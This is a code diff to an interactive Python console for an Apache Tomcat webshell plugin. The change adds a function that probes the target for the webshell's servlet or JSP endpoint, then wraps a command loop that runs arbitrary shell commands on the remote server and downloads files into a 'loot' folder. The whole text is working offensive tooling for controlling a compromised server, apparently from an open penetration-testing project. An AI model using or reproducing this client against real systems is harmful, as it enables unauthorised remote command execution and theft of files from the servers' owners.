@@ -42,9 +42,9 @@ def parseArgs():
     print("[+] src: https://github.com/p0dalirius/Tomcat-plugin-webshell\n")
 
     parser = argparse.ArgumentParser(description="Interactive console for Apache Tomcat webshell plugin")
-    parser.add_argument("-t", "--target", default=None, required=True, help='Apache Tomcat target instance')
+    parser.add_argument("-t", "--target", default=None, required=True, help="Apache Tomcat target instance")
     parser.add_argument("-k", "--insecure", dest="insecure_tls", action="store_true", default=False, help="Allow insecure server connections when using SSL (default: False)")
-    parser.add_argument("-v", "--verbose", default=False, action="store_true", help='Verbose mode. (default: False)')
+    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode. (default: False)")
     return parser.parse_args()
 
 
@@ -108,6 +108,18 @@ def remote_download(target, remote_path, local_path="./loot/", verbose=False):
         return False
 
 
+def detect_api_endpoint(target):
+    r = requests.post("%s/webshell/api" % target, data={})
+    if r.status_code == 200:
+        return "SERVLET_API"
+    else:
+        r = requests.post("%s/webshell/api.jsp" % target, data={})
+        if r.status_code == 200:
+            return "JSP_API"
+        else:
+            return None
+
+
 def show_help():
     print(" - %-15s %s " % ("download", "Downloads a file from the remote server."))
     print(" - %-15s %s " % ("help", "Displays this help message."))
@@ -131,21 +143,26 @@ if __name__ == '__main__':
         except AttributeError:
             pass
 
-    running = True
-    while running:
-        cmd = input("[webshell]> ").strip()
-        args = cmd.lower().split(" ")
+    api_endpoint = detect_api_endpoint(target=options.target)
 
-        if args[0] == "exit":
-            running = False
-        elif args[0] == "help":
-            show_help()
-        elif args[0] == "download":
-            if len(args) != 2 and len(args) != 3:
-                print("Usage: download <remotepath> [localpath]")
-            elif len(args) == 2:
-                remote_download(options.target, remote_path=args[1])
-            elif len(args) == 3:
-                remote_download(options.target, remote_path=args[1], local_path=args[2])
-        else:
-            remote_exec(options.target, cmd, verbose=options.verbose)
+    if api_endpoint is not None:
+        print("[+] Using API endpoint '%s'" % api_endpoint)
+
+        running = True
+        while running:
+            cmd = input("[webshell]> ").strip()
+            args = cmd.lower().split(" ")
+
+            if args[0] == "exit":
+                running = False
+            elif args[0] == "help":
+                show_help()
+            elif args[0] == "download":
+                if len(args) != 2 and len(args) != 3:
+                    print("Usage: download <remotepath> [localpath]")
+                elif len(args) == 2:
+                    remote_download(options.target, remote_path=args[1])
+                elif len(args) == 3:
+                    remote_download(options.target, remote_path=args[1], local_path=args[2])
+            else:
+                remote_exec(options.target, cmd, verbose=options.verbose)
